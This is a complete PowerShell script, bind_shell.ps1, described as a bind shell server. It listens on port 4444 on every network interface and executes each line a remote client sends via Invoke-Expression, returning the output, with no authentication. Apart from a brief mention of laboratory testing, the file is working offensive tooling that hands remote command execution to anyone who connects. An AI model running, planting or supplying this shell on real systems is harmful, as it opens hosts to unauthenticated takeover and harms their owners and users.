#!/usr/bin/env pwsh
<#
.SYNOPSIS
    Single-Threaded TCP Bind Shell Server.
.DESCRIPTION
    Establishes a synchronous network listener on a designated TCP port utilizing 
    the native .NET Framework [System.Net.Sockets.TcpListener] class. The daemon 
    intercepts inbound stream sequences, maps remote peer network coordinates, 
    and handles byte-to-string translation layer via standard IO Stream Wrappers.
    
    Includes granular exception handling to gracefully manage abrupt connection 
    teardowns (EOF/Null signals) and incorporates immediate transmission mechanics 
    via structured stream flush routines to prevent buffer allocation latency.
.PARAMETERS
    None. The endpoint structure uses predefined internal configuration variables 
    for network interface binding and port assignment.
.EXAMPLE
    .\bind_shell.ps1
    Starts the active daemon on port 4444, listening across all local network boundaries.
.NOTES
    File Name      : bind_shell.ps1
    Requirements   : PowerShell 5.1 or PowerShell Core 7+ (.NET Runtime dependency)
    Platform Notes : Requires appropriate local Firewall object rules to allow inbound 
                     traffic if tested across distinct hosts within a laboratory segment.
#>

$Address = [System.Net.IPAddress]::Any
$Port = 4444

$Listener = New-Object System.Net.Sockets.TcpListener($Address, $Port)
$Listener.Start()

Write-Host "Bind shell server is actively listening on port $Port..." -ForegroundColor Green
Write-Host "Press Ctrl+C in this window to stop the server.`n" -ForegroundColor Yellow

try {
    while ($true) {
        Write-Host "[*] Waiting for a client connection..." -ForegroundColor Cyan
        
        $Client = $Listener.AcceptTcpClient()
        $ClientIP = $Client.Client.RemoteEndPoint.Address
        $ClientPort = $Client.Client.RemoteEndPoint.Port
        Write-Host "[+] Connection established from $ClientIP`:$ClientPort" -ForegroundColor Green

        $Stream = $Client.GetStream()
        
        $Reader = New-Object System.IO.StreamReader($Stream)
        $Writer = New-Object System.IO.StreamWriter($Stream)
        
        $Writer.AutoFlush = $true

        $Writer.WriteLine("Connected to the PowerShell bind shell Server.")
        $Writer.WriteLine("Type your command (or type 'exit' to disconnect)")

        while ($Client.Connected) {
            $InputLine = $Reader.ReadLine()

            if ($null -eq $InputLine) {
                break
            }

            $Data = $InputLine.Trim()

            if ($Data -eq "exit" -or $Data -eq "quit") {
                $Writer.WriteLine("Goodbye!")
                break
            }

            if ($Data -ne "") {
                try {
                    $Result = Invoke-Expression -Command $Data -ErrorAction Stop | Out-String
                    $Writer.WriteLine($Result)
                }
                catch {
                    Write-Error $_.Exception.Message
                }
            }
        }

        Write-Host "[-] Client $ClientIP disconnected.`n" -ForegroundColor Yellow
        $Reader.Close()
        $Writer.Close()
        $Stream.Close()
        $Client.Close()
    }
}
catch {
    Write-Error $_.Exception.Message
}
finally {
    $Listener.Stop()
    Write-Host "`n[!] Listener stopped safely." -ForegroundColor Red
}
